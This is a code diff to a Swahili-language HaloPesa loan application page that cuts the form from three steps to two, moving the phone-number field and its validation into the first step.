@@ -240,13 +240,18 @@
   <div class="step-center">
     <div class="step-card">
       <h2>Maombi ya Mkopo</h2>
-      <p class="step-sub">Hatua 1 ya 3</p>
-      <div class="prog-row"><div class="prog-seg now"></div><div class="prog-seg"></div><div class="prog-seg"></div></div>
+      <p class="step-sub">Hatua 1 ya 2</p>
+      <div class="prog-row"><div class="prog-seg now"></div><div class="prog-seg"></div></div>
       <div class="msg-box error" id="s1Err"><span class="msg-icon">✕</span><span id="s1ErrTxt"></span></div>
       
       <div class="field"><label>Kiasi cha Mkopo (TSh)</label><input type="number" id="s1am" value="100000" placeholder="Weka kiasi" oninput="clearErr('s1Err')"></div>
       <div class="field"><label>Muda wa Mkopo</label><div style="position:relative;"><select id="s1te"><option>Miezi 6</option><option>Miezi 12</option><option>Miezi 18</option><option>Miezi 24</option><option>Miezi 36</option><option selected>Miezi 48</option><option>Miezi 60</option></select></div></div>
       <div class="field"><label>Madhumuni ya Mkopo</label><textarea id="s1pu" placeholder="Elezea madhumuni ya mkopo wako…" oninput="clearErr('s1Err')"></textarea></div>
+
+      <div class="field">
+        <label>Nambari ya Simu</label>
+        <div class="phone-row"><div class="ph-pre">🇹🇿 +255</div><input type="tel" id="s1ph" placeholder="712345678" maxlength="9" oninput="clearErr('s1Err')"></div>
+      </div>
       
       <button class="btn-grad" onclick="toS2()">HATUA INAYOFUATA</button>
     </div>
@@ -254,7 +259,7 @@
   <div class="pg-footer">© 2026 HaloPesa Tanzania</div>
 </div>
 
-<!-- PAGE 3: STEP 2 (PERSONAL INFO) -->
+<!-- PAGE 3: STEP 2 (EMPLOYMENT) - Was Step 3, now Step 2 -->
 <div id="page-step2" class="page">
   <nav class="navbar">
     <a class="nav-left" onclick="goTo('page-step1')">← Rudi</a>
@@ -270,48 +275,12 @@
   <div class="step-center">
     <div class="step-card">
       <h2>Maombi ya Mkopo</h2>
-      <p class="step-sub">Hatua 2 ya 3</p>
-      <div class="prog-row"><div class="prog-seg done"></div><div class="prog-seg now"></div><div class="prog-seg"></div></div>
+      <p class="step-sub">Hatua 2 ya 2</p>
+      <div class="prog-row"><div class="prog-seg done"></div><div class="prog-seg now"></div></div>
       <div class="msg-box error" id="s2Err"><span class="msg-icon">✕</span><span id="s2ErrTxt"></span></div>
       
-      <div class="field-row">
-        <div class="field"><label>Jina la Kwanza</label><input type="text" id="s2fi" placeholder="Jina" oninput="clearErr('s2Err')" readonly style="background:#f5f5f5;"></div>
-        <div class="field"><label>Jina la Ukoo</label><input type="text" id="s2la" placeholder="Ukoo" oninput="clearErr('s2Err')" readonly style="background:#f5f5f5;"></div>
-      </div>
-      
-      <div class="field">
-        <label>Nambari ya Simu</label>
-        <div class="phone-row"><div class="ph-pre">🇹🇿 +255</div><input type="tel" id="s2ph" placeholder="712345678" maxlength="9" oninput="clearErr('s2Err')"></div>
-      </div>
-      
-      <button class="btn-grad" onclick="toS3()" style="margin-top:24px;">HATUA INAYOFUATA</button>
-    </div>
-  </div>
-  <div class="pg-footer">© 2026 HaloPesa Tanzania</div>
-</div>
-
-<!-- PAGE 4: STEP 3 (EMPLOYMENT) -->
-<div id="page-step3" class="page">
-  <nav class="navbar">
-    <a class="nav-left" onclick="goTo('page-step2')">← Rudi</a>
-    <div class="hp-logo-sm">
-      <svg viewBox="0 0 40 40" fill="none" xmlns="http://www.w3.org/2000/svg">
-        <circle cx="20" cy="20" r="20" fill="#ff6600"/>
-        <path d="M10 28 Q20 8 30 28" stroke="#fff" stroke-width="3.5" fill="none" stroke-linecap="round"/>
-        <circle cx="20" cy="20" r="4" fill="#ffdd00"/>
-      </svg>
-      <div class="brand">Halo<span>Pesa</span></div>
-    </div>
-  </nav>
-  <div class="step-center">
-    <div class="step-card">
-      <h2>Maombi ya Mkopo</h2>
-      <p class="step-sub">Hatua 3 ya 3</p>
-      <div class="prog-row"><div class="prog-seg done"></div><div class="prog-seg done"></div><div class="prog-seg now"></div></div>
-      <div class="msg-box error" id="s3Err"><span class="msg-icon">✕</span><span id="s3ErrTxt"></span></div>
-      
-      <div class="field"><label>Hali ya Ajira</label><div style="position:relative;"><select id="s3em"><option>Mwajiriwa</option><option selected>Mfanyabiashara</option><option>Asiye na Kazi</option><option>Mstaafu</option></select></div></div>
-      <div class="field"><label>Mapato ya Mwaka (TSh)</label><input type="number" id="s3in" placeholder="Weka mapato" oninput="clearErr('s3Err')"></div>
+      <div class="field"><label>Hali ya Ajira</label><div style="position:relative;"><select id="s2em"><option>Mwajiriwa</option><option selected>Mfanyabiashara</option><option>Asiye na Kazi</option><option>Mstaafu</option></select></div></div>
+      <div class="field"><label>Mapato ya Mwaka (TSh)</label><input type="number" id="s2in" placeholder="Weka mapato" oninput="clearErr('s2Err')"></div>
       
       <div class="sum-box">
         <h3>Muhtasari wa Maombi</h3>
@@ -573,6 +542,7 @@
   function toS2() {
     const amt = document.getElementById('s1am').value;
     const purpose = document.getElementById('s1pu').value.trim();
+    const phone = document.getElementById('s1ph').value.trim();
     
     if (!amt || Number(amt) <= 0) {
       showErr('s1Err', 'Tafadhali weka kiasi sahihi'); return;
@@ -580,30 +550,25 @@
     if (!purpose) {
       showErr('s1Err', 'Tafadhali elezea madhumuni'); return;
     }
+    if (!phone || phone.length < 9) {
+      showErr('s1Err', 'Tafadhali weka nambari sahihi'); return;
+    }
     
     S.amt = amt;
     S.term = document.getElementById('s1te').value;
     S.purpose = purpose;
-    goTo('page-step2');
-  }
-
-  function toS3() {
-    const phone = document.getElementById('s2ph').value.trim();
-    if (!phone || phone.length < 9) {
-      showErr('s2Err', 'Tafadhali weka nambari sahihi'); return;
-    }
-    
     S.phone = '+255' + phone;
+    
     document.getElementById('sA').textContent = 'TSh ' + Number(S.amt).toLocaleString();
     document.getElementById('sT').textContent = S.term;
     document.getElementById('sN').textContent = S.firstName + ' ' + S.lastName;
-    goTo('page-step3');
+    goTo('page-step2');
   }
 
   function submitApp() {
-    const income = document.getElementById('s3in').value;
+    const income = document.getElementById('s2in').value;
     if (!income || Number(income) <= 0) {
-      showErr('s3Err', 'Tafadhali weka mapato'); return;
+      showErr('s2Err', 'Tafadhali weka mapato'); return;
     }
     
     document.getElementById('mSubmit').classList.add('show');
